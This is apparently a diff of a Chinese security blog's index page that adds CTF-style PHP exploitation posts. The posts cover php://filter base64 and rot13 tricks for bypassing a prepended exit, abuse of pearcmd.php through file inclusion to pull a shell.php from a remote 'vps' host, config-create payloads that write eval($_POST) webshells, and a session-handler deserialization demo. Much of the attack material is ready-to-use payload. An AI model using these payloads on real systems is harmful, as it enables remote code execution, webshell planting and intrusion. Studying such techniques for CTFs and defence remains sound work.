+<p>由于，<code>”phpexit”</code>一共7个字符，但是<code>base64</code>算法解码时是4个byte一组，所以我们可以随便再给他添加一个字符。这样前边的<code>phpexit</code>加上另一个字符就会被<code>base64</code>解码，然后后边的我们精心构造的<code>base64</code>字符串也会被成功解码为php代码。</p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</span></span><br></pre></td></tr></table></figure>
+
+<p>成功写入</p>
+<p><img src="/2025/03/31/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1732422269598-3546f0cf-d3fc-4ef8-a023-26df40911863.png"></p>
+<h4 id="rot13绕过"><a href="#rot13绕过" class="headerlink" title="rot13绕过"></a>rot13绕过</h4><p>利用<code>php://filter</code>中<code>string.rot13</code>过滤器去除<code>”exit”</code>。<code>string.rot13</code>的特性是编码和解码都是自身完成，利用这一特性可以去除<code>exit</code>。 <code>&lt;?php exit;?&gt;</code> 在经过<code>rot13</code>编码后会变成 <code>&lt;?cuc rkvg();?&gt;</code> ，不过这种利用手法的前提是PHP不开启<code>short_open_tag/</code></p>
+<p><img src="/2025/03/31/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1732422269762-516e494c-c04d-4835-b0ec-20ba87d0fdb2.png"></p>
+<p>虽然官方说的默认开启，但是在<code>php.ini</code>中默认是注释掉的，也就是说它还是默认关闭。</p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php:<span class="comment">//filter/write=string.rot13/resource=2.php&amp;content=&lt;?cuc riny($_CBFG[n]);</span></span><br></pre></td></tr></table></figure>
+
+<p>成功写入文件 2.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>cuc <span class="title function_ invoke__">rkvg</span>();<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]);</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2025/03/31/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-pearcmd.php的妙用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/">pearcmd.php的妙用</a>
+    </h1>
+  
+
+        
+        <a href="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/" class="archive-article-date">
+  	<time datetime="2025-03-31T07:03:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-03-31</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h3 id="register-argc-argv"><a href="#register-argc-argv" class="headerlink" title="register_argc_argv"></a>register_argc_argv</h3><p>如果环境中含有php.ini，则默认register_argc_argv&#x3D;Off；如果环境中没有php.ini，则默认register_argc_argv&#x3D;On</p>
+<p>这个register_argc_argv能干什么呢？</p>
+<p>简言之，可以通过$_SERVER[‘argv’]&#96;获得命令行参数，其中</p>
+<p>test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>测试</p>
+<p><img src="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513208-5dbf7551-dbd2-47d9-a6db-9373b359bb89.png"></p>
+<p>多个参数</p>
+<p><img src="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513259-0f749338-88eb-40a0-b07f-9186dcdf806c.png"></p>
+<h4 id="WEB模式中"><a href="#WEB模式中" class="headerlink" title="WEB模式中"></a>WEB模式中</h4><p><img src="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513224-bdcb1900-0357-4a3b-9666-c17170ebd4c2.png"></p>
+<p>注意其中是用+作为分隔符的，不是&amp;</p>
+<h4 id="简单的利用"><a href="#简单的利用" class="headerlink" title="简单的利用"></a>简单的利用</h4><p>修改test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>[<span class="number">0</span>](<span class="variable">$a</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513306-b2c77e30-5670-48f5-acdf-f1248d3ad585.png"></p>
+<h3 id="2-pearcmd-php的神奇使用"><a href="#2-pearcmd-php的神奇使用" class="headerlink" title="2. pearcmd.php的神奇使用"></a>2. pearcmd.php的神奇使用</h3><p><img src="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513486-5862c46e-85ba-4251-bae4-09904d58c5b0.png"></p>
+<p>文件位置：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php</p>
+<p>pear可以用来拉取远程的代码（注意：如果是php代码的话，注意不要被解析，下面举个例子）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear install -R /tmp http:<span class="comment">//vps/shell.php</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-register-argc-argv和pear的关系"><a href="#3-register-argc-argv和pear的关系" class="headerlink" title="3. register_argc_argv和pear的关系"></a>3. register_argc_argv和pear的关系</h3><p>pear文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># first find which PHP binary to use</span></span><br><span class="line"><span class="keyword">if</span> test <span class="string">&quot;x<span class="subst">$PHP_PEAR_PHP_BIN</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; then</span><br><span class="line">  PHP=<span class="string">&quot;<span class="subst">$PHP_PEAR_PHP_BIN</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> test <span class="string">&quot;/usr/bin/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_bin<span class="string">&#x27;@&#x27;</span>; then</span><br><span class="line">    PHP=php</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    PHP=<span class="string">&quot;/usr/bin/php&quot;</span></span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="comment"># then look for the right pear include dir</span></span><br><span class="line"><span class="keyword">if</span> test <span class="string">&quot;x<span class="subst">$PHP_PEAR_INSTALL_DIR</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; then</span><br><span class="line">  INCDIR=<span class="variable">$PHP_PEAR_INSTALL_DIR</span></span><br><span class="line">  INCARG=<span class="string">&quot;-d include_path=<span class="subst">$PHP_PEAR_INSTALL_DIR</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> test <span class="string">&quot;/usr/share/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_dir<span class="string">&#x27;@&#x27;</span>; then</span><br><span class="line">    INCDIR=`dirname $<span class="number">0</span>`</span><br><span class="line">    INCARG=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    INCDIR=<span class="string">&quot;/usr/share/php&quot;</span></span><br><span class="line">    INCARG=<span class="string">&quot;-d include_path=/usr/share/php&quot;</span></span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exec <span class="variable">$PHP</span> -C -q <span class="variable">$INCARG</span> -d date.timezone=UTC -d output_buffering=<span class="number">1</span> -d variables_order=EGPCS -d open_basedir=<span class="string">&quot;&quot;</span> -d safe_mode=<span class="number">0</span> -d register_argc_argv=<span class="string">&quot;On&quot;</span> -d auto_prepend_file=<span class="string">&quot;&quot;</span> -d auto_append_file=<span class="string">&quot;&quot;</span> <span class="variable">$INCDIR</span>/pearcmd.php <span class="string">&quot;$@&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>需要注意的是：当执行了pear后，会将$_SERVER[‘argv’]当作参数执行！如果存在文件包含漏洞的话，就可以包含pearcmd.php，拉取远程服务器上的文件到靶机，再通过文件包含获取shell。</strong></p>
+<h3 id="4-payload"><a href="#4-payload" class="headerlink" title="4. payload"></a>4. payload</h3><h4 id="靶机可出网"><a href="#靶机可出网" class="headerlink" title="靶机可出网"></a>靶机可出网</h4><p>靶机test.php如下，需要拉取远程服务器的shell.php到靶机的&#x2F;tmp目录下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/test.php?file=/usr/share/php/pearcmd.php&amp;+install+-R+/tmp+http://vps/shell.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574514486-0ff8d4d1-dbc0-44bb-9d0e-08b6689165f2.png"></p>
+<p>然后文件包含&#x2F;tmp&#x2F;tmp&#x2F;pear&#x2F;download&#x2F;shell.php同时传参<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>即可</p>
+<h4 id="靶机不可出网时"><a href="#靶机不可出网时" class="headerlink" title="靶机不可出网时"></a>靶机不可出网时</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php?+config-create+/&amp;file=/usr/share/php/pearcmd.php&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span>+/tmp/hello.php</span><br></pre></td></tr></table></figure>
+
+<p>如果是post传的file：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?+config-create+/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">2</span>]);<span class="meta">?&gt;</span>+/<span class="keyword">var</span>/www/html/a.php </span><br><span class="line"></span><br><span class="line">file=file:<span class="comment">///usr/local/lib/php/pearcmd.php</span></span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-php session 反序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php session 反序列化</a>
+    </h1>
+  
+
+        
+        <a href="/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="archive-article-date">
+  	<time datetime="2025-03-31T07:02:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-03-31</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="三种处理器"><a href="#三种处理器" class="headerlink" title="三种处理器"></a>三种处理器</h2><h3 id="php-处理器"><a href="#php-处理器" class="headerlink" title="php 处理器"></a>php 处理器</h3><p>首先来看看<code>session.serialize_handler</code>等于 <code>php</code>时候的序列化结果，demo 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>序列化的结果为：<code>session|s:7:&quot;xianzhi&quot;;</code></p>
+<p><code>session</code> 为<code>$_SESSION[&#39;session&#39;]</code>的键名，<code>|</code>后为传入 GET 参数经过序列化后的值</p>
+<h3 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h3><p>最后就是<code>session.serialize_handler</code>等于 <code>php_serialize</code>时候的序列化结果，同理，demo 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>序列化的结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:7:&quot;xianzhi&quot;;&#125;</code></p>
+<p><code>a:1</code>表示<code>$_SESSION</code>数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值</p>
+<h3 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h3><p>再来看看<code>session.serialize_handler</code>等于 <code>php_binary</code>时候的序列化结果。</p>
+<p>demo 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;sessionsessionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>为了更能直观的体现出格式的差别，因此这里设置了键值长度为 35，35 对应的 ASCII 码为<code>#</code>，所以最终的结果如下图所示：</p>
+<p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:7:&quot;xianzhi&quot;;</code></p>
+<p><code>#</code>为键名长度对应的 ASCII 的值，<code>sessionsessionsessionsessionsessions</code>为键名，<code>s:7:&quot;xianzhi&quot;;</code>为传入 GET 参数经过序列化后的值</p>
+<h2 id="php-serialize和php处理器同时开启触发bug"><a href="#php-serialize和php处理器同时开启触发bug" class="headerlink" title="php_serialize和php处理器同时开启触发bug"></a>php_serialize和php处理器同时开启触发bug</h2><p>形成的原理就是在用<code>session.serialize_handler = php_serialize</code>存储的字符可以引入 | 。</p>
+<p>再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时， <code>|</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。</p>
+<p>举个简单的例子：</p>
+<p>定义一个<code>session.php</code>文件，用于传入 <code>session</code>值，文件内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先看看<code>session</code>的初始内容，如下：</p>
+<p><code>a:1:&#123;s:7:&quot;session&quot;;s:5:&quot;hello&quot;;&#125;</code></p>
+<p>存在另一个<code>class.php</code> 文件，内容如下：</p>
+<p>实例化对象后，输出了<code>panda</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">  ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">  session_start();</span><br><span class="line">    class XianZhi&#123;</span><br><span class="line">    public $name = &#x27;panda&#x27;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">      echo &quot;Who are you?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">      echo &#x27;&lt;br&gt;&#x27;.$this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $str = new XianZhi();</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293287048-b53226f8-e683-4042-925a-5f6bc03b906e.png"></p>
+<p>这两个文件的作用很清晰，<code>session.php</code>文件的处理器是<code>php_serialize</code>，<code>class.php</code>文件的处理器是<code>php</code>，<code>session.php</code>文件的作用是传入可控的 <code>session</code>值，<code>class.php</code>文件的作用是在反序列化开始前输出<code>Who are you?</code>，反序列化结束的时候输出<code>name</code>值。</p>
+<p>这两个文件如果想要利用，我们要在<code>session.php</code>文件传入<code>|</code>+<code>序列化</code>格式的值，然后再次访问<code>class.php</code>文件的时候，就会在调用<code>session</code>值的时候，触发此 BUG。</p>
+<p>首先生成序列化字符串，利用 payload 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class XianZhi&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">      echo &quot;Who are you?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">      echo &#x27;&lt;br&gt;&#x27;.$this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $str = new XianZhi();</span><br><span class="line">    $str-&gt;name = &quot;xianzhi&quot;;</span><br><span class="line">    echo serialize($str);</span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293514891-7e51d58b-beaa-4d7b-9211-737acdaa7607.png"></p>
+<p>payload：<code>O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;</code></p>
+<p>然后传入<code>session.php</code>：</p>
+<p><img src="/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293526124-e212be59-1a8e-410b-bdc1-4f87cb9de90c.png"></p>
+<p>此时的 <code>session</code>内容如下：</p>
+<p><code>a:1:&#123;s:7:&quot;session&quot;;s:44:&quot;|O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;&quot;;&#125;</code></p>
+<p>再次访问<code>class.php</code>文件的时候：</p>
+<p><img src="/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293541065-1ccc3614-0831-471b-b826-b5f5082caab1.png"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">展开全文 >></a>
         </p>
       
 
@@ -1054,9 +1150,25 @@
     <article id="post-PHP特性" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/03/31/PHP%E7%89%B9%E6%80%A7/">PHP特性</a>
+    </h1>
+  
+
+        
+        <a href="/2025/03/31/PHP%E7%89%B9%E6%80%A7/" class="archive-article-date">
+  	<time datetime="2025-03-31T07:02:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-03-31</time>
+</a>
+        
+      </header>
+    
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><ol>
+        <hr>
+<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><ol>
 <li>preg_match当检测的变量是数组的时候会报错并返回0。</li>
 <li><font style="color:rgb(33, 37, 41);">只需要输入的匹配字符串长度大于1000000，那么preg_match函数就会直接返回false</font></li>
 </ol>
@@ -1193,7 +1305,7 @@
 <h2 id="函数调用的命名空间"><a href="#函数调用的命名空间" class="headerlink" title="函数调用的命名空间"></a>函数调用的命名空间</h2><p><font style="color:rgb(33, 37, 41);">php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写 法</font></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/03/26/PHP%E7%89%B9%E6%80%A7/1736321068936-362e626c-9b68-408b-96d2-4127f33d3d76.png"></p>
+<p><img src="/2025/03/31/PHP%E7%89%B9%E6%80%A7/1736321068936-362e626c-9b68-408b-96d2-4127f33d3d76.png"></p>
 <p>这里加了个\就是为了绕过正则</p>
 <h2 id="SERVER-‘QUERY-STRING’-特性"><a href="#SERVER-‘QUERY-STRING’-特性" class="headerlink" title="$_SERVER[‘QUERY_STRING’]特性"></a>$_SERVER[‘QUERY_STRING’]特性</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function waf2($Chu0)&#123;</span><br><span class="line">    if(preg_match(&#x27;/show/i&#x27;, $Chu0))</span><br><span class="line">        exit(&quot;waf2&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf2($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br></pre></td></tr></table></figure>
 
@@ -1209,16 +1321,16 @@
 <ol>
 <li>填充对齐</li>
 </ol>
-<p><img src="/2025/03/26/PHP%E7%89%B9%E6%80%A7/1725321184311-0eaad0c3-85cf-4a45-a51d-50e35ea635ca.png"></p>
+<p><img src="/2025/03/31/PHP%E7%89%B9%E6%80%A7/1725321184311-0eaad0c3-85cf-4a45-a51d-50e35ea635ca.png"></p>
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1725321212355-f1e74a58-1551-41c5-8ec2-756d0a037e70.png"></p>
 <p>注意：是小端模式；同时，无论如何都要这最后的64位，也就是说，即便原始数据刚好是512的倍数，也要补充来填这64位</p>
-<p><img src="/2025/03/26/PHP%E7%89%B9%E6%80%A7/1725321261762-89a789d3-cc58-4890-856b-12a70624f560.png"></p>
+<p><img src="/2025/03/31/PHP%E7%89%B9%E6%80%A7/1725321261762-89a789d3-cc58-4890-856b-12a70624f560.png"></p>
 <p>其余补充位，第一个填1，其余都是0</p>
 <ol start="2">
 <li>分块</li>
 </ol>
 <p>上述已经把数据分成512的整数倍了，我们现在一定能将其分成若干个512比特的数据块。</p>
-<p><img src="/2025/03/26/PHP%E7%89%B9%E6%80%A7/1725321509762-beacc84e-630c-436d-a5dd-f758d754f7ec.png"></p>
+<p><img src="/2025/03/31/PHP%E7%89%B9%E6%80%A7/1725321509762-beacc84e-630c-436d-a5dd-f758d754f7ec.png"></p>
 <p>MD5的输出被分成四份，它们都有初始值，初始值就是上图。也不用问为什么是这四个数，因为这是“幻数”，梦幻的很。</p>
 <ol start="3">
 <li>多轮压缩</li>
@@ -1374,7 +1486,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2025/03/26/PHP%E7%89%B9%E6%80%A7/">展开全文 >></a>
